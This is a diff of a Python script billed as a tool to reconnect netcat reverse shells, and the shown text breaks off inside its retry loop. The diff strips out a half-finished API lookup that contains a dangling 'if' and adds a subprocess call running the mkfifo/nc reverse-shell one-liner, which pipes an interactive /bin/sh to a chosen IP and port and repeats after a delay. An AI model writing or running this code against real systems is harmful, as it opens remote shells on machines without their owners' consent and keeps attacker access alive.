@@ -2,35 +2,19 @@
 import argparse
 import subprocess as sp
 import time
-import socket
-import requests as rq
 
 def main():
     parser = argparse.ArgumentParser(description="Julian's Reconnector - a simple tool to reconnect to your netcat reverse shells :)", epilog="Example: reconnector 192.168.69.420 6767 5")
     required_args = parser.add_argument_group("Required arguments")
-    required_args.add_argument("api", help="API url/ip (eg. 127.0.0.1, 192.168.1.1)")
-    required_args.add_argument("api_key", help="API key for authentication")
-
-    connecting_args = parser.add_argument_group("Connecting arguments")
-    connecting_args.add_argument("-c", "--connect", help="Connect to the host")
-    connecting_args.add_argument("port", type=int, help="Port number to connect to")
-    connecting_args.add_argument("delay", type=int, help="Delay in seconds between connection attempts")
-
-    
-
+    required_args.add_argument("ip", help="IP address (eg. 127.0.0.1, 192.168.1.1)")
+    required_args.add_argument("port", type=int, help="Port number (eg. 4444, 8080, 1234)")
+    required_args.add_argument("delay", type=int, help="Delay between reconnects (in seconds)")
     args = parser.parse_args()
-
-    if 
-
-    ip = rq.get(f"http://{args.api}/api/reconnect?api_key={args.api_key}")
-
-    connect(ip, args.port, args.delay)
+    connect(args.ip, args.port, args.delay)
 
 def connect(ip, port, delay):
     print(f"Connecting to {ip}:{port}")
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(delay)
-    s.connect((ip, port))
+    process = sp.Popen(f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} >/tmp/f", shell=True)
     while True:
         time.sleep(delay)
         try:
